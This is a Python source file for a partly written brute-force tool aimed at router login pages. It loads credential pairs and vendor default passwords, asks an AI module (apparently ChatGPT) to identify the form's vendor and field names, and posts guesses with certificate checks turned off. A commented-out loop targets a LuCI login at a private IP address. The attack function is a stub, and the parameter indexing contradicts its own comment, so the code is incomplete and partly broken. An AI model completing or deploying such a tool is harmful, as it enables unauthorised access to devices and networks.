import requests
import json
import csv
from ai_module import *

def parse_textfile():
    file = open("test.txt")
    credentialPairs = []
    for line in file:
        credentials = (line.split(":")) #Add option for user defined delimiter maybe?
        credentialPairs.append(credentials)
    return credentialPairs

def parse_csv(vendor):
    with open("default-passwords.csv", newline='') as csvfile:
        spamreader = csv.reader(csvfile, delimiter=',', quotechar='|')
        for row in spamreader:
            if row[0] == vendor:
                print(', '.join(row))


def find_parameters(res):
    #This returns what ChatGPT thinks is the vendor (index 0), the username param (index 1) and the password param (index 2)
    parameters = get_parameters(res)
    return parameters


def send_request(url, _data):
    _headers = {
"Content-Type": "application/x-www-form-urlencoded"
    }
    r = requests.post(url, data=_data, headers=_headers, verify=False, allow_redirects=True)
 
    return r


def craft_request(parameters, credentials):
    data = f"{parameters[0]}={credentials[0]}&{parameters[1]}={credentials[1]}"
    return data

def bruting_attack(res):
    pass
    #need to work out how to tie all these together

# creds = parse_file() # This returns an ARRAY of ARRAYS!!
# params = find_parameters()
# for pair in creds:
#     _data = craft_request(params, pair)
#     resp = send_request("https://192.168.56.110/cgi-bin/luci", _data)
#     print(resp)
#     print(resp.request.body)
#     print(resp.request.url)

